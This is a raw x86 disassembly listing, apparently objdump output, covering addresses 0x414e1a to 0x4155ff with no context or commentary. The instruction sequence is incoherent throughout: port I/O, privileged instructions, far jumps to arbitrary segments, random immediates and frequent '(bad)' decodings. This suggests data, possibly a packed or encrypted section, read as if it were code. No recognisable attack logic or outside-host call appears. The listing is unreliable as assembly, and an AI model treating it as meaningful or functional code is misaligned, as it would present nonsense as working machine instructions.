  414e1a:	and    esp,DWORD PTR [esi+0x284f1c6b]
  414e20:	pop    es
  414e21:	fisubr DWORD PTR [eax+0x1b]
  414e24:	dec    ebx
  414e25:	cli    
  414e26:	mov    ebx,edi
  414e28:	imul   esi,ecx,0xdeb8869f
  414e2e:	xchg   esp,eax
  414e2f:	stos   BYTE PTR es:[edi],al
  414e30:	ds data16 mov dh,0xe8
  414e34:	fmul   QWORD PTR [edi+esi*4-0x4a6e59fd]
  414e3b:	es das 
  414e3d:	adc    ebp,ebp
  414e3f:	sub    al,0xd8
  414e41:	inc    esi
  414e42:	mov    ds:0x70cd3986,al
  414e47:	aam    0x48
  414e49:	out    dx,eax
  414e4a:	sbb    BYTE PTR fs:[ebp-0x55],bl
  414e4e:	cwde   
  414e4f:	sbb    cl,BYTE PTR [ecx]
  414e51:	loope  0x414ec8
  414e53:	mov    edx,0xd0ad8f44
  414e58:	jo     0x414ebd
  414e5a:	mov    ebx,0xc8d9f6c
  414e5f:	je     0x414e91
  414e61:	arpl   WORD PTR [ecx-0x3a],di
  414e64:	loopne 0x414e04
  414e66:	mov    cl,0x33
  414e68:	ins    BYTE PTR es:[edi],dx
  414e69:	and    eax,0xa6e4ba1d
  414e6e:	aad    0x2d
  414e70:	cmp    eax,DWORD PTR [edx+ebx*2-0x2e4a4c4a]
  414e77:	push   ds
  414e78:	jp     0x414eec
  414e7a:	pop    ebx
  414e7b:	and    BYTE PTR [ecx-0x2d],dh
  414e7e:	hlt    
  414e7f:	cwde   
  414e80:	pop    ebp
  414e81:	cwde   
  414e82:	ja     0x414e05
  414e84:	adc    DWORD PTR [ecx-0x15],0xfebc73ff
  414e8b:	out    dx,al
  414e8c:	dec    esi
  414e8d:	iret   
  414e8e:	and    al,0x1f
  414e90:	jl     0x414f0c
  414e92:	xchg   ebx,eax
  414e93:	out    0xcc,al
  414e95:	lods   al,BYTE PTR ds:[esi]
  414e96:	lods   eax,DWORD PTR ds:[esi]
  414e97:	out    dx,al
  414e98:	das    
  414e99:	mov    eax,0x37f3ff39
  414e9e:	clc    
  414e9f:	xchg   ebp,eax
  414ea0:	aaa    
  414ea1:	cs (bad) 
  414ea3:	jmp    0xcc11:0x948c8965
  414eaa:	(bad)  
  414eab:	mov    al,0x20
  414ead:	ret    
  414eae:	adc    edi,DWORD PTR [ecx+edi*8+0x3d6397b6]
  414eb5:	mov    ch,0xdf
  414eb7:	ins    BYTE PTR es:[edi],dx
  414eb8:	ins    DWORD PTR es:[edi],dx
  414eb9:	out    dx,al
  414eba:	pop    eax
  414ebb:	lds    esp,FWORD PTR [edx-0x3470bff1]
  414ec1:	mov    al,0x39
  414ec3:	stos   BYTE PTR es:[edi],al
  414ec4:	shl    edx,1
  414ec6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ec7:	xor    eax,0xabd70241
  414ecc:	call   0x49c3:0xf5236e71
  414ed3:	out    dx,al
  414ed4:	cdq    
  414ed5:	outs   dx,BYTE PTR ds:[esi]
  414ed6:	push   0xffffff99
  414ed8:	ds ins DWORD PTR es:[edi],dx
  414eda:	and    BYTE PTR [ebp+0x2b],ah
  414edd:	in     al,0xf4
  414edf:	xchg   esi,eax
  414ee0:	loop   0x414f3d
  414ee2:	mov    es,WORD PTR [ecx-0x27461e35]
  414ee8:	call   0x8ad8:0xb12dfcc6
  414eef:	(bad)  
  414ef0:	jle    0x414ebd
  414ef2:	add    eax,0x4f7ada60
  414ef7:	imul   eax,DWORD PTR [edi],0xa
  414efa:	mov    ebx,0xa64d12e5
  414eff:	int    0x2e
  414f01:	fisub  DWORD PTR ds:0x5be54004
  414f07:	cmp    al,0x96
  414f0a:	mov    al,ds:0x307302e8
  414f0f:	jns    0x414f2b
  414f11:	xchg   edi,eax
  414f12:	sbb    DWORD PTR [ebx-0xf3714e3],ecx
  414f18:	inc    ecx
  414f19:	dec    ebp
  414f1a:	add    eax,0x515dd01b
  414f1f:	daa    
  414f20:	push   esp
  414f21:	call   0x71a6:0x5f7d0028
  414f28:	jge    0x414eca
  414f2a:	ret    0x8b70
  414f2d:	add    ah,ah
  414f2f:	mov    esi,0x5d842546
  414f34:	dec    edi
  414f35:	jo     0x414f1c
  414f37:	xchg   ebp,eax
  414f38:	add    ah,dh
  414f3a:	retf   
  414f3b:	or     ecx,DWORD PTR [ebx]
  414f3d:	cmp    dl,BYTE PTR [ebx]
  414f3f:	mov    bh,0xac
  414f41:	std    
  414f42:	retf   0xee3f
  414f45:	fnstenv ds:0xaeb9dc3
  414f4b:	add    ecx,DWORD PTR [esi]
  414f4d:	push   esp
  414f4e:	adc    BYTE PTR [edi+esi*2+0x2001f3ed],0x5b
  414f56:	leave  
  414f57:	push   esp
  414f58:	inc    BYTE PTR [ecx+0x5]
  414f5b:	lahf   
  414f5c:	scas   al,BYTE PTR es:[edi]
  414f5d:	push   edx
  414f5e:	cmp    al,0xbc
  414f60:	das    
  414f61:	mov    dh,BYTE PTR [eax+0x25]
  414f64:	outs   dx,DWORD PTR ds:[esi]
  414f65:	and    al,0xf3
  414f67:	aas    
  414f68:	out    0xb3,eax
  414f6a:	and    BYTE PTR [ebp-0x19],bh
  414f6d:	in     al,0x30
  414f6f:	lods   al,BYTE PTR ds:[esi]
  414f70:	jae    0x414f2f
  414f72:	stc    
  414f73:	and    ch,BYTE PTR [edi+0x79]
  414f76:	hlt    
  414f77:	push   ds
  414f78:	mov    ebp,0x7e2790c8
  414f7d:	cmp    BYTE PTR [ecx],al
  414f7f:	inc    ebp
  414f80:	mov    DWORD PTR [ebp+esi*4+0x22595075],ebp
  414f87:	pop    ss
  414f88:	cld    
  414f89:	jmp    0xd317:0xbb104693
  414f90:	imul   ebp,DWORD PTR [ebp-0x1a0f3b57],0xffffffe0
  414f97:	fwait
  414f98:	push   0xffffffb7
  414f9a:	in     eax,dx
  414f9b:	and    ebx,DWORD PTR [ecx]
  414f9d:	and    BYTE PTR [esi-0x4c9ba15f],0xc3
  414fa4:	jbe    0x414f66
  414fa6:	enter  0xf078,0x10
  414faa:	add    cl,BYTE PTR [eax-0x7f737111]
  414fb0:	repz fcomp QWORD PTR ds:0x65b60025
  414fb7:	mov    cl,0x45
  414fb9:	and    eax,0xaaaa532a
  414fbe:	push   esp
  414fbf:	cmc    
  414fc0:	push   cs
  414fc1:	aas    
  414fc2:	pop    ecx
  414fc3:	push   ecx
  414fc4:	es cdq 
  414fc6:	ja     0x414fed
  414fc8:	sub    ebx,DWORD PTR [ebx-0x1e]
  414fcb:	sbb    edi,DWORD PTR ss:[esi]
  414fce:	fdivr  QWORD PTR [ecx+0xde6c059]
  414fd4:	mov    eax,ds:0xb32a9463
  414fd9:	jmp    0xd3ea:0xfb0d90ca
  414fe0:	inc    ebx
  414fe1:	pop    ss
  414fe2:	mov    ds:0x528ff811,al
  414fe7:	push   ebx
  414fe8:	daa    
  414fe9:	push   edi
  414fea:	ins    DWORD PTR es:[edi],dx
  414feb:	pusha  
  414fec:	inc    ebx
  414fed:	fidivr WORD PTR [esp+eax*4]
  414ff0:	inc    ebx
  414ff1:	dec    ebx
  414ff2:	push   eax
  414ff3:	fnstcw WORD PTR [ecx+esi*1+0x4]
  414ff7:	div    DWORD PTR [edx-0x9]
  414ffa:	fcomip st,st(0)
  414ffc:	les    ebp,FWORD PTR [eax]
  414ffe:	out    0xba,al
  415000:	mov    cl,0x7d
  415002:	sbb    DWORD PTR [ebp+0x349e2c5b],esp
  415008:	sbb    DWORD PTR [edi-0x5812363d],eax
  41500e:	xchg   esi,eax
  41500f:	fidiv  WORD PTR [edx+0x78cef26e]
  415015:	jge    0x414fc8
  415017:	out    0xa9,al
  415019:	sbb    eax,0x2c539a3a
  41501e:	pop    esp
  41501f:	inc    eax
  415020:	jno    0x4150a0
  415022:	sahf   
  415023:	adc    ebp,DWORD PTR [eax+edx*1]
  415026:	retf   
  415027:	fwait
  415028:	imul   ecx,DWORD PTR [edi-0x788b9619],0xf
  41502f:	dec    ebx
  415030:	inc    ecx
  415031:	(bad)  
  415032:	sub    eax,DWORD PTR ds:0xada9be5
  415038:	fsubr  DWORD PTR [ebp+0x79ad04c8]
  41503e:	or     eax,0x51c8a716
  415043:	add    eax,0xa71ceaf2
  415048:	aam    0x25
  41504a:	mov    bl,0xa1
  41504c:	shl    BYTE PTR [ebp-0x2f],0x9c
  415050:	ss add al,0xce
  415053:	fcom   DWORD PTR [eax+0x31bbdd38]
  415059:	add    al,BYTE PTR [ebx]
  41505b:	jge    0x415094
  41505d:	pop    ebp
  41505e:	and    ebp,esi
  415060:	xor    dh,BYTE PTR [ebx-0x3f13ab6f]
  415066:	push   ecx
  415067:	sbb    BYTE PTR [ecx-0xd339856],bh
  41506d:	push   edx
  41506e:	xchg   ebx,eax
  41506f:	push   ebp
  415070:	sbb    BYTE PTR [ecx],cl
  415072:	cmc    
  415073:	xor    BYTE PTR [edi],dh
  415075:	mov    eax,DWORD PTR [ecx+ebx*8+0x3586d86]
  41507c:	push   ss
  41507d:	jle    0x415039
  41507f:	lahf   
  415080:	jg     0x415006
  415082:	inc    eax
  415083:	mov    BYTE PTR [ebp+0x19],bh
  415086:	test   ecx,eax
  415088:	jo     0x415071
  41508a:	rcr    DWORD PTR [ebp+0x38d1a6cc],cl
  415090:	jo     0x415075
  415092:	and    ah,BYTE PTR [ebx]
  415094:	xchg   ecx,eax
  415095:	or     esi,esp
  415097:	data16 cmp al,BYTE PTR [ebx+0x16]
  41509b:	mov    ebp,0xb797f7a9
  4150a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4150a1:	dec    ecx
  4150a2:	mov    dh,0x3a
  4150a4:	cld    
  4150a5:	inc    edi
  4150a6:	sar    BYTE PTR [edx],1
  4150a8:	pop    edi
  4150a9:	mov    dl,0x4
  4150ab:	push   ebx
  4150ac:	shr    BYTE PTR [esi],1
  4150ae:	push   edx
  4150af:	cdq    
  4150b0:	in     eax,0x1b
  4150b2:	in     al,0x21
  4150b4:	(bad)  
  4150b5:	mov    ch,0xc9
  4150b7:	mov    dh,0x3e
  4150b9:	jge    0x415042
  4150bb:	jle    0x4150a0
  4150bd:	inc    esi
  4150be:	ficom  DWORD PTR [ecx+eax*8+0x33e39d33]
  4150c5:	inc    edx
  4150c6:	jae    0x4150cb
  4150c8:	sbb    ebp,DWORD PTR [esi+ecx*4]
  4150cb:	mov    dh,0xa9
  4150cd:	mov    cl,0x2d
  4150cf:	shr    DWORD PTR [esi+0x7204d7e],1
  4150d5:	loopne 0x415109
  4150d7:	fadd   DWORD PTR [edi+edx*4]
  4150da:	neg    ebp
  4150dc:	std    
  4150dd:	pop    ecx
  4150de:	inc    eax
  4150df:	out    dx,eax
  4150e0:	rcl    DWORD PTR [esi],cl
  4150e2:	push   0x8
  4150e4:	(bad)  
  4150e6:	xor    DWORD PTR [eax+0x6a48b2c],esi
  4150ec:	aam    0xb8
  4150ee:	mov    bl,0xb4
  4150f0:	data16 sar BYTE PTR [esi-0x75],cl
  4150f4:	xor    edx,DWORD PTR [edi+0x59]
  4150f7:	cdq    
  4150f8:	xchg   esp,eax
  4150f9:	and    eax,0xbad0f297
  4150fe:	jg     0x415139
  415100:	mov    ds:0xa87feed3,eax
  415105:	cwde   
  415106:	mov    dh,0xcd
  415108:	sub    DWORD PTR [edi+0x6],edi
  41510b:	sbb    BYTE PTR [edi],ch
  41510d:	add    al,BYTE PTR [ecx+0x70aaef21]
  415113:	pop    edx
  415114:	stos   BYTE PTR es:[edi],al
  415115:	sub    dh,BYTE PTR cs:[ebx]
  415118:	js     0x415163
  41511a:	inc    edi
  41511b:	sti    
  41511c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41511d:	shl    DWORD PTR [ebx+0x53948c1b],cl
  415123:	adc    DWORD PTR [ebx],edi
  415125:	xor    al,0x96
  415127:	retf   
  415128:	adc    bh,0xab
  41512b:	(bad)  [ebx+0x79d0a75]
  415131:	push   cs
  415132:	test   BYTE PTR [edi-0x6f],dl
  415135:	xor    BYTE PTR [edx+edx*4+0x3bbac03a],ch
  41513c:	js     0x415181
  41513e:	test   DWORD PTR [esi-0x3423bd1e],0xa5554f04
  415148:	ja     0x4150da
  41514a:	dec    edx
  41514b:	ret    0xd46
  41514e:	cmc    
  41514f:	clc    
  415150:	sub    ecx,0xffffffd8
  415153:	push   ebx
  415154:	popf   
  415155:	inc    ebx
  415156:	iret   
  415157:	and    DWORD PTR [ebx+0xac2d47],edi
  41515d:	inc    eax
  41515e:	pushf  
  41515f:	jmp    0x5c9f:0xfe322f44
  415166:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415167:	inc    eax
  415168:	dec    ebx
  415169:	out    0x1a,eax
  41516b:	hlt    
  41516c:	mov    eax,ds:0xd1299fdd
  415171:	cwde   
  415172:	loop   0x4151cb
  415174:	jge    0x4151ea
  415176:	sub    BYTE PTR cs:[esi+0x460e73ed],dh
  41517d:	cmp    BYTE PTR [ebx],0x7e
  415180:	push   ebp
  415181:	out    0xbc,al
  415183:	xchg   edx,eax
  415184:	imul   ebx,edi,0xffffffe0
  415187:	push   0xa
  415189:	(bad)  
  41518a:	add    ebx,DWORD PTR [ebp+0x59925142]
  415190:	bound  eax,QWORD PTR [ebx]
  415192:	sub    BYTE PTR ds:0xeeedbebc,cl
  415198:	sbb    ebx,DWORD PTR [edx+0x73]
  41519b:	mov    edi,DWORD PTR ds:0x4d448cef
  4151a1:	pop    es
  4151a2:	xor    al,0xbf
  4151a4:	fstp   DWORD PTR ds:[esi+0x2ef9163e]
  4151ab:	adc    eax,0xf3395677
  4151b0:	data16 lock std 
  4151b3:	push   edi
  4151b4:	mov    cs,WORD PTR [edx]
  4151b6:	(bad)  [ecx-0x2f]
  4151b9:	popf   
  4151ba:	push   edx
  4151bb:	rep ins DWORD PTR es:[edi],dx
  4151bd:	add    ecx,DWORD PTR [edi+0x24]
  4151c0:	stos   DWORD PTR es:[edi],eax
  4151c1:	jo     0x4151dd
  4151c3:	dec    edx
  4151c4:	sub    bl,BYTE PTR [edi]
  4151c6:	dec    BYTE PTR [ecx+0x1a6ffd03]
  4151cc:	mov    eax,0x2d39a111
  4151d1:	inc    esp
  4151d2:	jle    0x41519b
  4151d4:	test   eax,0x6e27da2b
  4151d9:	dec    esi
  4151da:	mov    esi,DWORD PTR [esi-0x173acaba]
  4151e0:	es push esi
  4151e2:	mov    edi,0x5dfb3136
  4151e7:	or     DWORD PTR [ebx+0x6],eax
  4151ea:	mov    edx,0x73e62233
  4151ef:	mov    dh,0xc5
  4151f1:	cmp    BYTE PTR [esi-0x15],0xcc
  4151f5:	jmp    0x37dc68ee
  4151fa:	(bad)  
  4151fb:	cdq    
  4151fc:	nop
  4151fd:	cmp    cl,dl
  4151ff:	stos   DWORD PTR es:[edi],eax
  415200:	push   es
  415201:	loopne 0x41520c
  415203:	div    BYTE PTR [edx+0x11]
  415206:	gs loope 0x4151cb
  415209:	pop    esp
  41520a:	outs   dx,DWORD PTR ds:[esi]
  41520b:	xor    al,BYTE PTR [eax+0x1fc91d10]
  415211:	mov    eax,0x51149c80
  415216:	xchg   BYTE PTR [edx+0x41],bh
  415219:	outs   dx,DWORD PTR ds:[esi]
  41521a:	pop    esp
  41521b:	call   0xffb3d4e9
  415220:	inc    esi
  415221:	daa    
  415222:	add    al,dh
  415224:	loopne 0x4151d2
  415226:	int    0x97
  415228:	mov    ds:0xe16cc501,al
  41522d:	xchg   edx,eax
  41522e:	call   0x426f:0xc4b89827
  415235:	dec    edi
  415236:	dec    ebx
  415237:	jg     0x4151d4
  415239:	fmul   DWORD PTR [eax]
  41523b:	adc    al,0xae
  41523d:	or     al,0x79
  41523f:	mov    esi,fs
  415241:	mov    ds:0xf87e8da4,eax
  415246:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415247:	mov    eax,ds:0x3c14a76b
  41524c:	fsub   st(0),st
  41524e:	fcom   DWORD PTR [edi]
  415250:	pusha  
  415251:	out    dx,eax
  415252:	adc    eax,0x682a098a
  415257:	xor    dh,dh
  415259:	add    al,0x32
  41525b:	pop    ecx
  41525c:	xchg   BYTE PTR [ebx+0x66a49c1],bl
  415262:	adc    eax,0x16a9895b
  415267:	pop    ecx
  415268:	cld    
  415269:	mov    eax,0x84698ad4
  41526e:	cmp    eax,0x12596d7a
  415273:	jno    0x415288
  415275:	add    BYTE PTR [edx],bh
  415277:	pop    ds
  415278:	cs or  eax,0x2d8e816e
  41527e:	lds    ecx,FWORD PTR [edx-0x395a6e44]
  415284:	push   edx
  415285:	jp     0x4152c5
  415287:	xchg   ebp,eax
  415288:	or     eax,0xf3e682c6
  41528d:	movd   mm3,DWORD PTR [esi-0x76]
  415291:	retf   
  415292:	fisub  DWORD PTR [eax-0x6f]
  415295:	aam    0xcb
  415297:	and    al,BYTE PTR [ecx]
  415299:	push   fs
  41529b:	xor    DWORD PTR [eax],eax
  41529d:	add    ebx,DWORD PTR [edi+ebp*2+0x57]
  4152a1:	scas   eax,DWORD PTR es:[edi]
  4152a2:	mov    ch,0x16
  4152a4:	pusha  
  4152a5:	test   eax,0x3b01107e
  4152aa:	ins    BYTE PTR es:[edi],dx
  4152ab:	inc    edx
  4152ac:	(bad)  
  4152ad:	pop    esi
  4152ae:	fs clc 
  4152b0:	xor    BYTE PTR [ebx],bl
  4152b2:	push   0x299dd9d1
  4152b7:	or     al,0x7b
  4152b9:	push   ecx
  4152ba:	add    DWORD PTR [eax+0x5e],edi
  4152bd:	and    esp,ecx
  4152bf:	sbb    ebx,edi
  4152c1:	jbe    0xdec6379b
  4152c7:	retf   0xf301
  4152ca:	xor    cl,BYTE PTR [ebx+0x33]
  4152cd:	(bad)  
  4152ce:	inc    BYTE PTR [ebx-0x783cf37e]
  4152d4:	add    BYTE PTR [eax+0x6a],0xc4
  4152d8:	pop    edi
  4152d9:	or     eax,0x7aba641e
  4152de:	pop    ds
  4152df:	mov    DWORD PTR [edi-0x7f16aa30],esi
  4152e5:	lea    esp,[eax+0x33a8d113]
  4152eb:	or     edx,esp
  4152ed:	xor    al,0x9a
  4152ef:	mov    bl,0x14
  4152f1:	pushf  
  4152f2:	mov    BYTE PTR [ebx+0x42],ch
  4152f5:	and    edi,esi
  4152f7:	mov    ebp,0x7adcc7a2
  4152fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4152fd:	inc    ecx
  4152fe:	pusha  
  4152ff:	mov    ah,0x33
  415301:	pop    ebx
  415302:	cmp    al,0x35
  415304:	fs mov dh,0xc0
  415307:	inc    esp
  415308:	and    esp,ebp
  41530a:	icebp  
  41530b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41530c:	(bad)  
  41530d:	xchg   edi,eax
  41530e:	call   0xbfc3:0xb6088bc7
  415315:	(bad)  
  415316:	xlat   BYTE PTR ds:[ebx]
  415317:	nop
  415318:	mov    esi,0xf3c8b94f
  41531d:	std    
  41531e:	sub    al,0x47
  415320:	push   esp
  415321:	gs stos DWORD PTR es:[edi],eax
  415323:	jae    0x41533f
  415325:	inc    esp
  415326:	mov    edx,edx
  415328:	aaa    
  415329:	pop    ebx
  41532a:	call   0xac50ad29
  41532f:	inc    edi
  415330:	xor    eax,0x5802a023
  415335:	in     eax,dx
  415336:	sbb    eax,0xf69dde1b
  41533b:	(bad)  [ebp+0x47]
  41533e:	jne    0x4152f0
  415340:	or     BYTE PTR [edi-0x306ae81d],al
  415346:	dec    esp
  415347:	sbb    al,0xf6
  415349:	dec    edi
  41534a:	jno    0x4153c8
  41534c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41534d:	xor    al,0x14
  41534f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415350:	push   eax
  415351:	mul    DWORD PTR [esi]
  415353:	xor    ebx,DWORD PTR [edi-0x7335297]
  415359:	jne    0x4153a9
  41535b:	in     al,0x7e
  41535d:	xor    BYTE PTR [ebx+edi*1+0x6],ah
  415361:	dec    edi
  415362:	mov    edx,0xe9bf4d0
  415367:	jno    0x41530f
  415369:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41536a:	jae    0x415332
  41536c:	stc    
  41536d:	ja     0x415315
  41536f:	retf   0xe0f3
  415372:	xor    ebp,esi
  415374:	and    edi,0x4a
  415377:	jmp    0x4153a6
  415379:	(bad)  
  41537a:	repnz aam 0xb2
  41537d:	xchg   edi,eax
  41537e:	pop    esp
  41537f:	mov    edi,0xddb860d1
  415384:	jb     0x41535f
  415386:	sub    ebx,esp
  415388:	out    0x38,eax
  41538a:	pusha  
  41538b:	pop    ss
  41538c:	mov    fs,WORD PTR [ebx+0x2ebe9e4c]
  415392:	sti    
  415393:	lods   al,BYTE PTR ds:[esi]
  415394:	pop    esi
  415395:	test   BYTE PTR [ecx+0x45aaabc3],ah
  41539b:	jbe    0x4153dc
  41539d:	dec    edi
  41539e:	xchg   DWORD PTR [esp+ecx*4],eax
  4153a1:	adc    dh,cl
  4153a3:	ja     0x41532d
  4153a5:	mov    edx,0x602e5200
  4153aa:	stc    
  4153ab:	bswap  ebp
  4153ad:	bound  ebx,QWORD PTR [edi]
  4153af:	in     al,dx
  4153b0:	retf   0xc05d
  4153b3:	and    DWORD PTR [esi],eax
  4153b5:	pop    ebx
  4153b6:	into   
  4153b7:	lds    esi,FWORD PTR [ebx-0x69cb6da4]
  4153bd:	inc    esi
  4153be:	or     edx,ebp
  4153c0:	(bad)  
  4153c1:	popf   
  4153c2:	pop    ss
  4153c3:	pop    esi
  4153c4:	(bad)  
  4153c5:	jmp    0xa658e4be
  4153ca:	aad    0x5e
  4153cc:	add    eax,0x6dad7e5d
  4153d1:	xor    edi,ebx
  4153d3:	or     al,0xa6
  4153d5:	ins    BYTE PTR es:[edi],dx
  4153d6:	jnp    0x415420
  4153d8:	mov    cl,BYTE PTR [edx+0xe]
  4153db:	push   ebp
  4153dc:	icebp  
  4153dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4153de:	push   0x3a
  4153e0:	cmp    ecx,eax
  4153e2:	inc    esi
  4153e3:	cmp    eax,0x44136858
  4153e8:	das    
  4153e9:	into   
  4153ea:	mov    edx,0x7b07b9e4
  4153ef:	adc    eax,0x699e0e5d
  4153f4:	fisttp QWORD PTR [edi+0x57cdca4e]
  4153fa:	repz mov ebx,0xea623863
  415400:	fwait
  415401:	sbb    BYTE PTR [edx],cl
  415403:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415404:	shr    eax,0x66
  415407:	sbb    eax,0x8915085c
  41540c:	mov    ecx,0x2a747a87
  415411:	cs dec esi
  415413:	(bad)  
  415414:	(bad)  
  415416:	dec    DWORD PTR [ebp-0x68]
  415419:	out    dx,al
  41541a:	shl    DWORD PTR [edi+ebx*2],cl
  41541d:	sar    BYTE PTR [ecx+0x8],0x22
  415421:	ss out 0x54,eax
  415424:	std    
  415425:	ret    
  415426:	xor    dh,cl
  415428:	retf   
  415429:	inc    esp
  41542a:	or     bh,bl
  41542c:	xchg   esi,eax
  41542d:	push   edx
  41542e:	int    0xa1
  415430:	iret   
  415431:	or     bh,al
  415433:	push   edi
  415434:	mov    ds:0xdeb8c5bc,eax
  415439:	dec    ebx
  41543a:	xlat   BYTE PTR ds:[ebx]
  41543b:	fstp   DWORD PTR [ebp+0x5c]
  41543e:	mov    bh,0x39
  415440:	xchg   BYTE PTR [ebx+0x68],cl
  415443:	mov    al,ds:0x2ead5916
  415448:	mov    dl,0xa2
  41544a:	pop    eax
  41544b:	pop    edi
  41544c:	loopne 0x415462
  41544e:	test   DWORD PTR [esi],eax
  415450:	test   eax,0x96cc0c0a
  415456:	sbb    DWORD PTR [esp+edx*2],edx
  415459:	push   ds
  41545a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41545b:	out    dx,al
  41545c:	mov    eax,0x38bf7648
  415461:	lock lahf 
  415463:	mov    eax,DWORD PTR [edi-0x191aec57]
  415469:	cmp    DWORD PTR [esi+0x6d],ebp
  41546c:	test   eax,0x781fe51c
  415471:	out    dx,al
  415472:	nop
  415473:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415474:	dec    ebp
  415475:	fld    QWORD PTR [ecx-0x763ff688]
  41547b:	imul   eax,DWORD PTR [ecx-0x2d],0xf5b1ece3
  415482:	sbb    eax,0x35d7206f
  415487:	pusha  
  415488:	pop    ebx
  415489:	dec    ecx
  41548a:	leave  
  41548b:	js     0x41547d
  41548d:	or     dh,BYTE PTR [ebx-0x13]
  415490:	dec    ebx
  415491:	clc    
  415492:	popa   
  415493:	stc    
  415494:	adc    BYTE PTR ds:[ecx-0x4687b4],cl
  41549b:	out    0xcf,eax
  41549d:	(bad)  
  41549f:	lock sbb edi,DWORD PTR [ecx+0x5b]
  4154a3:	aam    0x4b
  4154a5:	sbb    al,0x10
  4154a7:	mov    esp,0xa55b3fd0
  4154ac:	and    al,0x62
  4154ae:	mov    dl,0x7a
  4154b0:	or     ebx,esi
  4154b2:	arpl   WORD PTR [ecx+0x12],cx
  4154b5:	jno    0x41543b
  4154b7:	test   eax,0xdf8f4cb3
  4154bc:	add    eax,0xa1884266
  4154c1:	or     edx,0x6b8294ff
  4154c7:	dec    ecx
  4154c8:	fidiv  WORD PTR cs:[ecx-0x6ea94274]
  4154cf:	sar    DWORD PTR [ebx+0x5bcb4f09],cl
  4154d5:	stc    
  4154d6:	imul   ebx,DWORD PTR [edi+0x25f40c91],0x315e8e3e
  4154e0:	xchg   DWORD PTR [ebx+eiz*1-0x719fc5db],ebx
  4154e7:	ins    DWORD PTR es:[edi],dx
  4154e8:	sbb    al,0x99
  4154ea:	cld    
  4154eb:	pop    ebx
  4154ec:	es push ebx
  4154ee:	pop    esp
  4154ef:	mov    dl,0xf
  4154f1:	popf   
  4154f2:	cmp    BYTE PTR [eax],cl
  4154f4:	hlt    
  4154f5:	(bad)  
  4154f6:	out    0x34,al
  4154f8:	jp     0x415525
  4154fa:	dec    edi
  4154fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4154fc:	icebp  
  4154fd:	push   cs
  4154fe:	pop    ds
  4154ff:	int3   
  415500:	in     eax,dx
  415501:	rol    DWORD PTR [edi+0x74d0d91d],1
  415507:	mov    DWORD PTR [eax-0x259f6955],esp
  41550d:	or     bl,dh
  41550f:	pop    eax
  415510:	(bad)  
  415511:	call   DWORD PTR [edx+ebp*4+0x6762380e]
  415518:	repz (bad) 
  41551b:	and    DWORD PTR [eax+0x35],ecx
  41551e:	add    BYTE PTR [ebx],bh
  415520:	jmp    0x415581
  415522:	jp     0x41557b
  415524:	mov    esp,0x78227505
  415529:	retf   
  41552a:	jg     0x4154c0
  41552c:	jno    0x4155aa
  41552e:	ret    0xfab
  415531:	xchg   edx,eax
  415532:	leave  
  415533:	and    al,0x69
  415535:	xchg   bp,ax
  415537:	lods   eax,DWORD PTR ds:[esi]
  415538:	mov    BYTE PTR [ebp+0x53517c58],al
  41553e:	add    dl,al
  415540:	jmp    0x31ed:0x8f468617
  415547:	mov    ebp,edx
  415549:	xchg   esp,esp
  41554b:	mov    ds:0xfd6c83cc,eax
  415550:	out    dx,al
  415551:	jae    0x4154e4
  415553:	xchg   edi,eax
  415554:	retf   
  415555:	or     bl,BYTE PTR [edi]
  415557:	inc    ebp
  415558:	mov    ebp,0x23dcdb78
  41555d:	fs fwait
  41555f:	(bad)  
  415560:	cmp    esp,eax
  415562:	fisub  DWORD PTR [edx+0x29fa85a3]
  415568:	xlat   BYTE PTR ds:[ebx]
  415569:	lock mov ecx,0x7260393d
  41556f:	add    ch,cl
  415571:	mov    ecx,0x3825da56
  415576:	inc    eax
  415577:	in     al,dx
  415578:	mov    dl,BYTE PTR [ebx-0x5e]
  41557b:	mov    al,ds:0xf687af6a
  415580:	sbb    BYTE PTR [ebp-0x120f302d],dl
  415586:	add    eax,0xc949b198
  41558b:	pop    eax
  41558c:	loopne 0x415573
  41558e:	xor    ecx,esi
  415590:	or     cl,BYTE PTR [esi+0x658e1e9]
  415596:	arpl   WORD PTR [edi-0x7558cbd6],cx
  41559c:	imul   edi,DWORD PTR [eiz*4-0x2abf2057],0x32
  4155a4:	cmp    eax,0xe0fb79d
  4155a9:	or     al,0xc7
  4155ab:	outs   dx,DWORD PTR ds:[esi]
  4155ac:	repz fisttp QWORD PTR [ebx+eax*2+0x58]
  4155b1:	mov    dh,0x18
  4155b3:	fcom   QWORD PTR gs:[ebx+0x451e00db]
  4155ba:	out    dx,al
  4155bb:	aam    0xdf
  4155bd:	call   0x46e7:0x913a631a
  4155c4:	das    
  4155c5:	sahf   
  4155c6:	in     eax,dx
  4155c7:	pop    ds
  4155c8:	xor    dh,BYTE PTR [ebp+0x4b]
  4155cb:	in     al,0x8f
  4155cd:	stos   DWORD PTR es:[edi],eax
  4155ce:	hlt    
  4155cf:	pop    es
  4155d0:	repz adc BYTE PTR [esi+ebp*8],0xaf
  4155d5:	xchg   esi,eax
  4155d6:	aaa    
  4155d7:	icebp  
  4155d8:	fwait
  4155d9:	mov    es,edx
  4155db:	jmp    0x70d55207
  4155e0:	jp     0x4155a6
  4155e2:	(bad)  
  4155e3:	push   ebx
  4155e4:	push   ebx
  4155e5:	and    edi,DWORD PTR [edx]
  4155e7:	leave  
  4155e8:	inc    ebp
  4155e9:	cmp    al,0x35
  4155eb:	rcl    DWORD PTR [edx+0x201fcb6a],cl
  4155f1:	rcl    BYTE PTR [ebp+0x4a],cl
  4155f4:	push   es
  4155f5:	dec    ebp
  4155f6:	dec    ebp
  4155f7:	add    BYTE PTR [ebp-0x2fac3b8],bh
  4155fd:	popf   
  4155fe:	pop    edi
  4155ff:	cmp    BYTE PTR [ebp+0x74],ah
